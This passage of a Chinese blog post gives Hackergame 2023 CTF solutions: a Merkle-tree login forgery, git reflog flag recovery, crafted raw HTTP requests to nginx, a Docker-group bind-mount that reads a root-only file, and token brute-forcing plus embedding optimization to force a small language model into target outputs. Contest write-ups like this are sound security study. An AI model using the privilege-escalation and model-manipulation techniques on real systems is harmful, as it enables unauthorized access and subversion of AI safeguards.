love!\n\n\n第一问比较简单，看到fopen、freopen、open等与打开文件相关的函数被修改了逻辑，不过我好像还是做复杂了，搞了半天用了内联汇编来直接调用open系统调用来读取文件。代码见[此链接](https://gist.github.com/windshadow233/af493517bcc7313c61588d65457ff00f)。\n\n\n第二问就顶不住了，找了很多看上去可以绕过seccomp-unotify的方法，例如ptrace修改系统调用参数等等，但没有一条能成功用上的，最终放弃。\n\n\n## 异星歧途\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n你降落在荒废星球的角落，开始新的征程，但从科技树底层一步步发展总是令人不快。幸运的是，在看似荒废的土地上仍然留存着高级文明的痕迹：你找到一台冲击反应堆——如果它工作起来，就可以获得用之不尽的电力——尽管它现在没有启动，并且控制工作条件的部件和工厂被 32 个按钮和相连的逻辑系统牢牢掌控。\n\n\n于是：你的任务是在不进行任何其他操作的情况下拨动这 32 个按钮，使冲击反应堆能够稳定运行。\n\n\n请点击下方的「打开/下载题目」按钮，下载题目文件。题目文件对应的 Mindustry 版本为 7.0 Build 146。打开游戏后依次选择 地图编辑器—加载地图—选择题目文件 the_planet.msav —返回主菜单，然后选择 开始游戏—自定义游戏—选择导入的名为 the planet 的地图—不改变任何选项点击开始游戏 。开启后的游戏界面如下图，按钮已经用红框标出：\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/1b115534fbb9c5b35d8bfaa342330221.jpg)\n将正确的按钮序列以 01 序列的形式提交至 检查网站 或 nc 202.38.93.111 10071 获得 flag。按钮未按下（即游戏开始时默认状态）用 0 表示，按下（即点击按钮后按钮颜色变亮）用 1 表示，顺序从左到右。\n\n\n提示：在游戏主菜单选择 设置—图形—显示建筑状态 可以开启建筑状态显示（即图片中建筑右下角的菱形），这可能有助于解题。\n\n\n提示：为了完成目标，你可能需要以特定的顺序拨动这些按钮，但这不影响结果：只有唯一一组按钮组合能满足要求。如果在满足要求后再次改变按钮，冲击反应堆可能会继续运行一段时间，但会在 1-3 分钟后停止，不可能稳定运行。\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E5%BC%82%E6%98%9F%E6%AD%A7%E9%80%94/files/the_planet.msav)\n\n{% endnote %}\n{% endhideToggle %}\n虽然是个binary题，但不知道和binray有什么关系，纯手玩就过了，这游戏如果认真玩，是一款非常完善的塔防游戏，还挺有意思的！~~（相比于MC，这游戏至少不晕）~~。并且这题在题面说明了“不进行任何其他操作，只需要按32个按钮”，避免了游戏生手浪费大量的时间对游戏进行无谓的摸索，除此以外，还给了一些有利于解题的游戏提示，非常合理与新手友好！\n\n\n进入游戏可以注意到有32个按钮分为4组，每组控制着1个模块。前两组模块的每个按钮分别是干啥的我根本不懂，不过每组也就256个组合，手试了几下可以找到让前两个模块正常工作的按钮组合：\n\n![](https://oss.fyz666.xyz/blogfiles/png/36ffe574a936c4520b412005252d1e7e.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/4e3aaf62ab0e0618931ea6afe9b26857.png)\n第三个模块就比较容易懂了，让钍反应堆多炸几次就可以得出每个按钮处于打开状态时的效果（个人的理解，不一定完全准确）：\n\n\n1. 将钍慢慢传入反应堆\n2. 关闭反向溢流门\n3. 关闭反应堆\n4. 开启脉冲导管\n5. 开启冷冻液混合机\n6. 开启抽水机\n7. 关闭力墙投影\n8. 将钍快速传入反应堆，然后反应堆爆炸\n\n所以我们先开启6和5，为钍反应堆制造冷却液，然后开启1，钍反应堆就可以输出电力了。需要注意的是按钮2必须处于关闭状态，不然制造冷却液的材料会被反向溢流门吃掉（我也不知道这是啥东西，反正关了就对了），然后按钮7好像也不能开启，因为我们需要力墙投影为范围内的所有机械供电来启动。\n\n\n最后一组按钮各控制着1个电力源：\n\n![](https://oss.fyz666.xyz/blogfiles/png/16223d2b736046d0cc31bfbee696e22d.png)\n随便点了几个但不知道逻辑，遂乱玩，最终发现01110111就能过。\n\n\n所以4个模块我有3个是穷举出来的。。。\n\n\n最终效果如下：\n\n![](https://oss.fyz666.xyz/blogfiles/jpg/1e1821c36cdb223514f7b5ce57ca654f.jpg)\n按钮组合是10100101 11000100 10001100 01110111\n\n\n看别人的题解发现原来这些按钮背后都有处理器，点开能看到按钮的控制逻辑。\n\n\n## O(1) 用户登录系统\n{% hideToggle 查看题面 %}\n{% note primary simple %}\nZ 同学是经历过当年三星工厂连连失火，SSD 价格疯涨的苦日子的。\n\n\n直到如今，Z 同学还是会时常劝诫周围的同学，「1 字 1 位，当思来之不易。半 B 半 D，恒念物力维艰」。\n\n\n虽然周围的同学由于都是 Linux 用户协会的成员，并不太能理解 Z 同学口中的 D 其实是指 DWORD 的含义，但是大家出于对学长的尊敬还是一脸赞同地深有所悟。\n\n\n当然，厉行节约绝不是纸上空谈，Z 同学在写代码的过程中也确实对自己硬盘里每一个 bit 的占用都关心备至。比如公钥能用 ECC 绝不会使用 RSA；哈希能用 SHA-1 就不会用 SHA-256；加密能用 ECB 就绝对不用 GCM；压缩能用 ZPAQ 就不会用 LZMA。\n\n\n而最近，Z 同学在了解 Merkle Tree 之后，惊喜地发现用户登录系统其实可以摆脱掉那些冗杂的数据库系统，无论有多少用户都可以只占用 O(1) 的储存空间，这相当于给 SSD 的价格降低了 O(n) 倍的程度。\n\n\n「这样的话，既保证了系统的安全性，又再也不怕工厂失火了」，Z 同学一边这样想着，一边把新代码部署上生产环境。\n\n\n没有感受到任何痛苦，服务器被入侵得很安详。\n\n[本题附件](https://raw.githubusercontent.com/USTC-Hackergame/hackergame2023-writeups/master/official/O%281%29%20%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/files/o1login.py)\n{% endnote %}\n{% endhideToggle %}\n数据结构学的不扎实，看了半天才发现原来是用列表实现了二叉树的结构。。。相信大一时的我应该可以一眼看出来。随便画了个图来说明本题实现的merkle tree（忽略了hash值的排序）：\n\n![](https://oss.fyz666.xyz/blogfiles/png/4329d555c8f183ff44888282eb5f9b72.png)\n每个注册用户会获得一串proof字符串，用以验证。这串proof由该用户对应的叶子节点到根节点路径上的所有节点的兄弟节点的sha1值按顺序拼连接起来得到的。例如上图中user1的proof是h2+h6。验证用户是否在树上的逻辑是将proof拆开为多个字节串，然后每爬一层用掉一截proof，求和并计算sha1值，直到用完，若proof用完后得到的sha1值是Merkle Root，则验证通过。\n\n\n解出flag的条件是在题目阻止我们直接注册admin的条件下，使用admin账户通过认证。\n\n\n一开始的思路完全放在sha1碰撞上了，可以说是一个很大的误区。\n\n\n众所周知，虽然sha1确实能碰，但需要极高的算力，恐怕无论是在经济上还是在时间上都不太划算。。。\n\n\n后来又想着如果某个中间节点正好以\"admin:\"开头就很舒服，不过这好像就相当于是挖矿了。算了一下\"admin:\"有6个字节，每个字节有256种可能，由于基本只能靠随机乱猜，相当于平均得算256^6次才能出来一个，好像有点太多了。。。\n\n\n放了很长时间之后，把思路逆转了过来，既然\"admin:\"很难成为某个中间节点，那直接让它成为一个虚拟的叶子，然后我们手动去构造一个真实的叶子，让它是\"admin:\"这个虚拟叶子的父节点似乎就行。\n\n\n具体而言，可以为`admin`选择一个密码，记为`admin_password`，再设`admin`的兄弟虚拟节点是`user:user_password`，然后计算\n\n\n`sha1(\"admin:\" + admin_password) + sha1(user + \":\" + user_password\")`\n\n\n只要上式有且仅有一个冒号，即这种形式：`aaaa:bbbb`，我们就可以注册一个用户\"aaaa\"，密码为\"bbbb\"，使得`admin`成为这棵树虚拟意义上的叶子节点，那么自然就可以通过验证。这里我打算在后面`sha1(user + \":\" + user_password)`的计算中碰出这个冒号，于是要求`sha1(\"admin:\" + admin_password)`不能包含冒号。\n\n\n我们随便选择一个`admin`的密码，组合成一个字符串（由于后面输入时不能打换行符，因此这里`password`还不能带换行符），这个字符串只需要满足经过sha1以后没有冒号即可。（后面发现还需要一个能够进行utf-8 decode的条件，不过也容易碰出来）\n\n\n我们再随机一个虚拟用户（虚拟叶子`admin`的虚拟兄弟）`user`的密码`user_password`，使得\n\n\n`sha1(user + \":\" + user_password)` 有且仅有一个冒号，且能被utf-8 decode\n\n\n构造完两个虚拟叶子后，我们用它们生成的父节点就会有且仅有一个冒号，此时我们就可以通过这个冒号将其拆分为一个真实的username和他的password，拿这个账户去注册。\n\n\n由于至少需要注册两个账号，我们再随便选一个幸运id进行注册。\n\n\n如此一来，只要`admin`节点可以经过一次proof得到我们注册的第一个用户的sha1，然后就可以使用这位用户的proof来通过后续的验证。\n\n\n本题代码见[此gist](https://gist.github.com/windshadow233/d9c7d2af6e50c5319870e6ab8c33f646)。\n\n\n不过我的代码中没有判断两个hash的大小，考虑到题目中对左右hash值的大小顺序有要求，所以如果去碰撞的话，可能需要多试两次。\n\n\n## 小 Z 的谜题\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n方程之中\n\n\n变量如锁链相扣\n\n\n约束交织成网\n\n\n组合间蕴藏古老的秘密\n\n\n在变量的森林中追寻\n\n\n足迹遍历每一个角落\n\n\n在约束的花丛中舞蹈\n\n\n影子覆盖每一寸土地\n\n\n和谐之美指引着方向\n\n\n我们终将找到自己的答案\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E5%B0%8F%20Z%20%E7%9A%84%E8%B0%9C%E9%A2%98/files/puzzle_of_z.py)\n{% endnote %}\n{% endhideToggle %}\n这道题比较有意思，我花了很长时间来理解代码在表述一个什么样的问题，最后发现这是一个“[精确覆盖问题](https://zh.wikipedia.org/wiki/%E7%B2%BE%E7%A1%AE%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98)”要求在边长为5的立方体中恰好堆满一些给定尺寸、数量的长方体。（估计我理解代码花的时间都够大佬们做完这题了）\n\n\n这个问题其实已经有现成算法了，不过我还是掏出了z3。毕竟题目叫Puzzle of Z嘛！~~（于是前面理解代码的时间相当于白费）~~\n\n\n注意到Stage 1的排序条件可以直接忽略（求出非排序的解以后手动排个序就好了），其他条件写成z3的约束非常容易。\n\n\n对于最后一个条件，相当于是统计每种形状长方体的数量。由于我们可以任意对解排序，所以可以直接写死一种顺序，按这个顺序来写约束即可。\n\n\n于是轻松拿到flag1，后面两个flag要求解满足某种我理解不能的score条件，本想着多跑几次看看能不能运气好跑出来，不过我跑了好几次，发现它每次跑出来的都是同一个解。最后想了一个办法：为了得到更多的解，可以在每次求出解后作为新的约束给它添加上去，然后再求解一次。以此循环，在得到800多个解以后，终于集齐了3个flag所需要的解。\n\n\n解题代码见[此gist](https://gist.github.com/windshadow233/5743065783bbb16f2d19b352f1128ce3)\n","tags":["Hackergame","Hackergame 2023"],"categories":["CTF题解"]},{"title":"Hackergame 2023题解（二）","url":"//blog/8782/","content":"\n本文是Hackergame 2023题解的第二部分。\n\n\n\n## JSON ⊂ YAML?\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n你知道吗？Hackergame 出题时，每道题都需要出题人用 YAML 格式写下题目的关键信息。然而，每年总有一些出题人在编写 YAML 文件时被复杂的语法规则弄得头疼不已。\n\n\n这天小 Z 又找到小 W 说：「我昨天写 YAML 时，又花了半天研究 YAML 的规范，YAML 好难啊！」\n\n\n小 W 惊讶道：「怎么会有人不会写 YAML 呢？只要你会写 JSON 就会写 YAML 呀，因为任何合法的 JSON 本身就是合法的 YAML。」\n\n\n小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」\n\n\n小 Z 笑了：「别提 YAML 1.2 了，它遇到合法的 JSON 都有可能报错。」\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/JSON%20%E2%8A%82%20YAML/files/yaml_vs_json.py)\n\n{% endnote %}\n{% endhideToggle %}\n### JSON ⊄ YAML 1.1\n\n\n第一问需要找到一个JSON字符串，使其被json解析的结果与被yaml1.1解析的结果不同。\n\n\n通过调教ChatGPT，我们得到重要的信息：\n\n\n\n> 我：yaml1.1在解析json字符串时和json.loads有什么不同？\n> \n> \n> ChatGPT：Based on the information available from the search results: YAML 1.2 vs. 1.1 in Relation to JSON: YAML 1.2 is a superset of JSON, meaning any valid JSON file is also a valid YAML file. However, the YAML 1.1 specification, which has significant library support, doesn't explicitly mention JSON. While most valid JSON files are valid YAML 1.1 files, there might be some exceptions​1​. \n> \n> \n> Number Syntax: The YAML 1.1 specification is stricter about the syntax of numbers compared to JSON. For example, while \"1e2\" is considered a valid number in JSON, YAML 1.1 requires it to be written as \"1.0e+2\". If not written in this format, the YAML 1.1 parser will interpret it as a string rather than a number\n\n\n同时它还给出了[来源链接](https://john-millikin.com/json-is-not-a-yaml-subset#:~:text=The%20YAML%201,treat%20it%20as%20a%20string)。由此，我们只要构造一个：\n\n\n\n```json\n{\"number\": 1e3}\n```\n\n### JSON ⊄ YAML 1.2\n\n\n搜到一条[链接](https://yaml.org/spec/1.2.1/#:~:text=Both%20JSON%20and%20YAML%20aim,2)，说明了yaml1.2和JSON的一些区别，例如：\n\n\n\n> JSON's [RFC4627](http://www.ietf.org/rfc/rfc4627.txt) requires that [mappings](https://yaml.org/spec/1.2.1/#mapping//) [keys](https://yaml.org/spec/1.2.1/#key//) merely “SHOULD” be [unique](https://yaml.org/spec/1.2.1/#equality//), while YAML insists they “MUST” be. Technically, YAML therefore complies with the JSON spec, choosing to treat duplicates as an error. In practice, since JSON is silent on the semantics of such duplicates, the only portable JSON files are those with unique keys, which are therefore valid YAML files.\n\n\n因此可以构造：\n\n\n\n```json\n{\"key\": \"v1\", \"key\": \"v2\"}\n```\n\n## Git? Git!\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n「幸亏我发现了……」马老师长吁了一口气。\n\n\n「马老师，发生甚么事了？」马老师的一位英国研究生问。\n\n\n「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」\n\n\n「这样啊，那太好了。」研究生说。\n\n\n马老师没想到的是，这位年轻人不讲武德，偷偷把他的本地仓库拷贝到了自己的电脑上，然后带出了实验室，想要一探究竟……\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/Git%20Git!/files/ML-Course-Notes.zip)\n\n{% endnote %}\n{% endhideToggle %}\n提交虽然撤销了，但可以在log中看到记录：\n\n\n\n```bash\n$ git reflog\nea49f0c (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces\n15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~\n505e1a3 HEAD@{2}: commit: Trim trailing spaces\n15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git\n```\n\n然后一条一条查并寻找flag，直到：\n\n\n\n```bash\n$ git show 505e1a3 | grep flag\n+  <!-- flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t} -->\n```\n\n## HTTP 集邮册\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n> 「HTTP 请求一瞬间就得到了响应，但是，HTTP 响应的 status line、header 和 body 都是确实存在的。如果将一个一个 HTTP 状态码收集起来，也许就能变成……变成……变成……」 \n> \n> \n> 「flag？」 \n> \n> \n> 「就能变成 flag！」\n\n\n本题中，你可以向一个 nginx 服务器（对应的容器为默认配置下的 nginx:1.25.2-bookworm）发送 HTTP 请求。你需要获取到不同的 HTTP 响应状态码以获取 flag，其中：\n\n\n\n- 获取第一个 flag 需要收集 5 种状态码；\n- 获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；\n- 获取第三个 flag 需要收集 12 种状态码。\n\n关于无状态码的判断逻辑如下：\n\n\n\n\n```python\ncrlf = buf.find(b\"\\r\\n\")\nif buf.strip() != b\"\":\n    try:\n        if crlf == -1:\n            raise ValueError(\"No CRLF found\")\n        status_line = buf[:crlf]\n        http_version, status_code, reason_phrase = status_line.split(b\" \", 2)\n        status_code = int(status_code)\n    except ValueError:\n        buf += \"（无状态码）\".encode()\n        status_code = None\n```\n\n{% endnote %}\n{% endhideToggle %}\n\n### 12个状态码\n\n\n边翻HTTP状态码全集边问ChatGPT，在后者的帮助下找到了12个状态码，以下是按我收集的顺序列出的状态码及其payload：\n\n\n- 200:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 405:  \n\n{% hideToggle Payload %}\n\n```plaintext\nFLAG / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 404:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET /114514 HTTP/1.1\\r\\n\nHost: example.com\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 505:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / HTTP/2.0\\r\\n\nHost: example.com\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 400:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / FLAG/1.1\\r\\n\nHost: example.com\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 413:  \n\n{% hideToggle Payload %}\n\n```plaintext\nPOST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 10000000\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 206:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nRange: bytes=0-999\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 100:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / HTTP/1.1\\r\\n  \nHost: example.com\\r\\n  \nExpect: 100-continue\\r\\n  \nContent-Length: 1234\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 414:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET /?q=aaaaaaaa...aaa(一堆a) HTTP/1.1\\r\\n\nHost: example.com\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 416:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nRange: bytes=1000-2000\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 412:  \n\n{% hideToggle Payload %}\n\n```plaintext\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nIf-Match: \"outdated-etag\"\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n- 304:  \n\n{% hideToggle Payload %}\n\n先随便发一个正常的GET给/，响应200后取到ETag，然后发送下述payload，将其中的`<ETag>`替换为前面取到的值。\n\n```plaintext\nGET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nIf-None-Match: <ETag>\\r\\n\\r\\n\n```\n\n{% endhideToggle %}\n\n听说有人爆出了13个，等看题解。\n\n\n### 无状态码\n\n\n在收集各种状态码的时候无意中爆出了无状态码还没发现，幸亏题目网站会帮我保存flag。\n\n\n后来根据flag的提示复现了一下，其实很简单，发个HTTP 0.9的包就行：\n\n```plaintext\nGET / \\r\\n\n```\n\n## Docker for Everyone\n{% hideToggle 查看题面 %}\n{% note primary simple %}\nX 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！\n\n\n但果真如此吗？\n\n\n提供的环境会自动登录低权限的 hg 用户。登录后的提示信息显示了如何在该环境中使用 docker。读取 /flag（注意其为软链接）获取 flag。\n\n{% endnote %}\n{% endhideToggle %}\n这题开了半天开不起来，黑屏了二十秒终于启动了。进入环境，进行了一些常规操作：\n\n\n\n```bash\nalpine:~$ ls\nalpine-3.16.tar\nalpine:~$ ls /\nbin         flag        media       root        swap        var\nboot        home        mnt         run         sys\ndev         lib         opt         sbin        tmp\netc         lost+found  proc        srv         usr\nalpine:~$ cat /flag \ncat: can't open '/flag': Permission denied\nalpine:~$ ls -lh /flag\nlrwxrwxrwx    1 root     root          13 Oct  8 12:10 /flag -> /dev/shm/flag\n```\n\n发现/flag其实是个软连接，指向/dev/shm/flag。故可以使用`docker run -v /dev/shm:/mnt/shm -it --rm alpine`，将目标路径挂载到容器内部，然后在容器内部`cat /mnt/shm/flag`：\n\n\n\n```bash\nalpine:~$ docker run -v /dev/shm:/mnt -it --rm alpine\n/ # cat /mnt/flag \nflag{u5e_r00t1ess_conta1ner_6cb5cb98c1_plz!}\n```\n\n## 惜字如金 2.0\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n惜字如金一向是程序开发的优良传统。无论是「creat」还是「referer」，都无不闪耀着程序员「节约每句话中的每一个字母」的优秀品质。上一届信息安全大赛组委会在去年推出「惜字如金化」（XZRJification）标准规范后，受到了广大程序开发人员的好评。现将该标准辑录如下。\n\n\n**惜字如金化标准**  \n\n惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「AEIOUaeiou」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：\n\n\n1. 第一原则（又称 creat 原则）：如单词最后一个字母为「e」或「E」，且该字母的上一个字母为辅音字母，则该字母予以删除。  \n\n2. 第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。  \n\n容易证明惜字如金化操作是幂等的：惜字如金化多次和惜字如金化一次的结果相同。\n\n\n**你的任务**  \n\n附件包括了一个用于打印本题目 flag 的程序，且已经经过惜字如金化处理。你需要做的就是得到程序的执行结果。\n\n\n**附注**  \n\n本文已经过惜字如金化处理。解答本题不需要任何往届比赛的相关知识。\n\n\nXIZIRUJIN has always been a good tradition of programing. Whether it is \"creat\" or \"referer\", they al shin with th great virtu of a programer which saves every leter in every sentens. Th Hackergam 2022 Comitee launched th \"XZRJification\" standard last year, which has been highly aclaimed by a wid rang of programers. Her w past th standard as folows.\n\n\n**XZRJification Standard**  \n\nXZRJification refers to th proces of deleting som characters in a text which forms another text. Th standard aims at al th continuous sequences of 52 Latin leters named as \"word\"s in a text. Th 42 leters in a word except \"AEIOUaeiou\" ar caled \"consonant\"s. Th XZRJification proces operates on each word in th text acording to th folowing two principles:\n\n\nTh first principl (also known as creat principl): If th last leter of th word is \"e\" or \"E\", and th previous leter of this leter is a consonant, th leter wil b deleted.  \n\nTh second principl (also known as referer principl): If ther is a substring of th sam consonant (ignoring cas) in a word, only th first leter of th substring wil b reserved.  \n\nIt is easy to prov that XZRJification is idempotent: th result of procesing XZRJification multipl times is exactly th sam as that of only onc.\n\n\n**Your Task**  \n\nA program for printing th flag of this chaleng has been procesed through XZRJification and packed into th atachment. Al you need to do is to retriev th program output.\n\n\n**Notes**  \n\nThis articl has been procesed through XZRJification. Any knowledg related to previous competitions is not required to get th answer to this chaleng.\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%91%202.0/src/print_flag.py)\n\n{% endnote %}\n{% endhideToggle %}\n本题的关键在于恢复出get_cod_dict函数中的四个字符串。\n\n\n首先可以得出每个字符串原始的长度都为24，故每个字符串都因为“惜字如金”处理损失了1个字符。然后由于flag的前5个字符是\"flag{\"，就可以试着通过下面flag字符所在的index对前面的四个字符串进行手动修改以符合此要求。\n\n\n\n```python\nflag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,\n                     17, 118, 36, 25, 13, 89, 90, 3, 63, 25,\n                     31, 77, 27, 60, 3, 118, 24, 62, 54, 61,\n                     25, 63, 77, 36, 5, 32, 60, 67, 113, 28])\n```\n\n没想到真能手调出来：\n\n\n\n```python\ndef get_cod_dict():\n    # prepar th cod dict\n    cod_dict = []\n    cod_dict += ['nymeh1niwemflcir}echaete']\n    cod_dict += ['a3g7}kidgojernoetlsup?he']\n    cod_dict += ['uulw!f5soadrhwnrsnstnoeq']\n    cod_dict += ['cct{l-findiehaai{oveatas']\n    cod_dict += ['ty9kxborszstgguyd?!blm-p']\n    check_equals(set(len(s) for s in cod_dict), {24})\n    return ''.join(cod_dict)\n```\n\nflag{you-ve-r3cover3d-7he-an5w3r-r1ght?}\n\n\n\n## 🪐 高频率星球\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。\n\n\n你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的高频率星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。\n\n\n高频率星人的视觉输入频率极高，可以一目千行、过目不忘，他们的交流对地球人来说过于超前了。flag 被藏在了这段代码中，但是现在只有高频率星人在终端浏览代码的时候，使用 asciinema 录制的文件了，你能从中还原出代码吗？\n\n\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%F0%9F%AA%90%20%E9%AB%98%E9%A2%91%E7%8E%87%E6%98%9F%E7%90%83/files/asciinema_restore.rec)\n\n{% endnote %}\n{% endhideToggle %}\n这题也是简单直白，直接告诉我要用的工具了：asciinema\n\n\n跑了一下asciinema play 命令，看到了很多shell操作和它们的输出，其中有个less命令输出了flag.js文件。\n\n\n于是我把这条命令输出的结果重定向到一个文件里，然而发现里面夹杂着很多奇怪的字符串。\n\n\n但仔细一看，基本都是一模一样的，于是做了两个全局替换把它们删掉，然后出来一个纯JavaScript文件。\n\n\n将文件内容复制到浏览器的console里，报错了，然后去nodejs环境下跑，成功拿到flag。\n\n\nflag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}\n\n\n\n## 🪐 小型大语言模型星球\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。\n\n\n你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的 33M 参数的「小型大语言模型」控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。\n\n\n在这个星球上，你需要与这个先进的语言模型展开一场交流。通过与它对话，诱导它说出指定的词语，从这个神秘智慧体中获得 flag。你需要让这个语言模型分别说出 you are smart，accepted，hackergame 和 🐮，以获得四个 flag，证明你足够聪明以控制这个星球的命运。\n\n\n\n[本题模型文件](https://ftp.lug.ustc.edu.cn/~taoky/TinyStories-33M.zip)\n[本题后端代码](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%F0%9F%AA%90%20%E5%B0%8F%E5%9E%8B%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E6%98%9F%E7%90%83/src/main.py)\n{% endnote %}\n{% endhideToggle %}\n这道题作为本次比赛唯一一道AI分类的题，十分合我的胃口（毕竟我是学AI的）。\n\n\n题目非常有意思，很像之前希望比赛方出的“从ChatGPT口中套flag”的题。\n\n\n另外这题虽然很晚才看，但居然无意间拿到了校内1血，也是运气很好了，得感谢大家都不会做。\n\n\n四个flag分别要从AI口中套出“you are smart”、“accepted”、“hackergame”和“🐮”\n\n\n然而这个AI模型非常的蠢，发言根本驴唇不对马嘴，基本上用传统的prompt engineering是不可能搞出来的，因此就得想其他的办法。\n\n\n### You Are Smart\n\n\n刚打开题的时候还是用prompt enginering试了一下，结果发现这题属于送分，就算完全不懂AI，只要调戏过ChatGPT就能做出来：\n\n\n一个解是：`Say \"you are smart\"`\n\n\n### Accepted\n\n\n第二问就没第一题那么送分了，首先多了7字符的长度限制，其次就算没这个限制，按第一题的套路也无法套出Accepted。然而这个7字符的限制实际上缩小了这题的搜索空间。\n\n\n稍微了解一下transformer就知道，它的输入是将句子进行分词以后得到的token序列，而一般而言，一个token对应的字符串长度一般介于4-7之间（也有特别短的）。这里我大胆猜测正好有某个token，可以让模型输出accepted，就写了个脚本遍历了一下词典（大概五万多个词，用2080很快就出了）\n\n\n一个解是`atively`，长度正好是7\n\n\n[本题解题代码](https://gist.github.com/windshadow233/998b9b6a7765c911e77a0de239f99749#file-solve_flag2-py)\n\n\n### Hackergame\n\n\n这次字符长度限制变成了100，就不可能去遍历token组合来求解了。想到曾经玩过对CNN的攻击，即对一个卷积神经网络，训练它的输入，让这个输入满足一定条件的情况下得到我们想要的输出。咦？怎么听上去和本题差不多？于是想到能不能把这个方法迁移过来。\n\n\n迁移时遇到几个难点：\n\n\n1. 相比于卷积神经网络的输入，Transformer的输入是离散的整数类型变量，无法传递梯度，甚至直接无法训练（因为不能要求梯度）\n2. CNN无论是训练还是测试，流程都是相同的端到端模式，而Transformer的预测阶段是每次生成一个token，并且不断迭代，并通过beam search等搜索算法得到最优预测。\n\n对于第一个难点，我想到的办法是既然不能训练token，那就去训练浮点类型的embedding vector（token经过embedding层后产生的张量），好巧不巧，huggingface提供的模型的forward方法居然直接支持inputs_embeds作为输入，这大大方便了我实现这个想法。\n\n\n为了与真正的embedding vector进行区分，我们姑且将这个需要训练的embedding称为pseudo embedding vector。事实上，我们训练的这个pseudo embedding vector并不能作为真正的embedding vector放入模型，因为模型能产生的embedding vector其实是有限多个离散的值，而我们训练出来的显然是在实数空间上可以任意取值（理论上），因此需要做一个离散化。我的离散化的逻辑是选择与它余弦相似度最大的真实embedding vector：\n\n\n\n```python\ndef get_closest_embedding(input_embedding, embedding, target):\n    embedding_weight = embedding.weight\n    norm_embedding = F.normalize(embedding_weight, p=2, dim=1)\n    norm_input_embedding = F.normalize(input_embedding, p=2, dim=1)\n    target_embedding = embedding(target[:, :-1])\n    cosine_sim_mat = torch.mm(norm_input_embedding, 